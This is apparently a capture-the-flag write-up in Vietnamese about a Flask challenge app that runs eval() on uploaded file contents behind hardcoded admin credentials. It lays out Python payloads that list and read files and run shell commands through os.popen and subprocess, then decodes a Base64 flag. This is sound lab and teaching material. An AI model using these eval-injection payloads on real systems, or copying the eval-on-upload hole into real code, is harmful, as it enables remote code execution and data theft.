Phân tích nhanh đoạn code:

### **1. Những điểm đáng chú ý**

* **Đăng nhập**:

  ```python
  users = {"admin": "adminpass"}
  ```

  Tài khoản cố định: `admin / adminpass`

* **Upload**:

  ```python
  file = request.files['file']
  filename = file.filename
  if any(x in filename for x in ['.php', '.phtml', '.htaccess']):
      return "Permission Denied"
  filepath = os.path.join(UF, filename)
  file.save(filepath)
  with open(filepath, 'r') as f:
      code = f.read()
      try:
          result = eval(code)
      except Exception as e:
          result = f"Error: {e}"
      return f"{result}"
  ```

  **Vấn đề lớn**: Sau khi upload file, server sẽ `eval()` toàn bộ nội dung file (dưới dạng Python code).

  * Chỉ chặn `.php`, `.phtml`, `.htaccess` trong tên file → vẫn có thể upload `.txt` hoặc `.py`.
  * `eval()` **thực thi code Python** của attacker → **RCE (Remote Code Execution)**.

* **Flag**:

  * Flag được lưu trong `./uploads/<random>.txt` với:

    ```python
    flag_name = secrets.token_hex(8) + '.txt'
    f.write(base64.b64encode(flag.encode()).decode())
    ```

    → Flag **được Base64 encode** và nằm trong thư mục `uploads`.

* **Điều kiện để tải file**:

  ```python
  @app.route('/uploads/<filename>')
  def get_file(filename):
      session = request.cookies.get('session')
      if session not in sessions or sessions[session] != 'admin':
          return "Forbidden"
      return send_file(os.path.join(UF, filename))
  ```

  → Muốn tải file, **phải là admin**.

---

### **2. Quy trình khai thác**

**Mục tiêu**: Đọc nội dung `flag_name` trong thư mục `uploads`.

Có 2 cách:

* **Cách 1 (Local file read qua eval)**:

  * Upload 1 file Python (vd: `a.txt`) chứa lệnh đọc tất cả file trong thư mục `uploads`:

    ```python
    __import__('os').listdir('./uploads')
    ```

    Khi upload, code sẽ:

    ```python
    result = eval(code)  # => eval("__import__('os').listdir('./uploads')")
    ```

    → Trả về danh sách file, trong đó có `flag_name`.

  * Sau khi biết tên file flag (ví dụ `d4f8c3a2b0a1.txt`), upload tiếp file khác:

    ```python
    open('./uploads/d4f8c3a2b0a1.txt').read()
    ```

    → Trả về chuỗi Base64.

  * Decode Base64 để lấy flag.

---

* **Cách 2 (RCE full)**:

  * Upload file với nội dung:

    ```python
    __import__('os').popen('ls -al ./uploads').read()
    ```

    hoặc:

    ```python
    __import__('subprocess').check_output(['ls','./uploads']).decode()
    ```

    → Có thể thực hiện bất kỳ lệnh hệ thống nào.

---

### **3. Cụ thể Payload**

#### Bước 1: Login

```
POST /  username=admin&password=adminpass
```

→ Nhận cookie `session`.

#### Bước 2: Upload file 1 (`list.txt`):

```python
__import__('os').listdir('./uploads')
```

Kết quả trả về ví dụ:

```
['flagfile1234abcd.txt']
```

#### Bước 3: Upload file 2 (`readflag.txt`):

```python
open('./uploads/flagfile1234abcd.txt').read()
```

Kết quả:

```
'RkxBR3tIZXJlX0lzX1RoZV9GbGFnfQ=='
```

#### Bước 4: Decode Base64:

```
echo 'RkxBR3tIZXJlX0lzX1RoZV9GbGFnfQ==' | base64 -d
FLAG{Here_Is_The_Flag}
```

---

### **4. Tại sao đây là lỗ hổng nghiêm trọng?**

* `eval()` trên nội dung upload → Arbitrary Code Execution (ACE).
* Không có sandbox, không hạn chế builtins, không disable imports.
* Từ RCE → đọc flag → chiếm quyền hệ thống.

---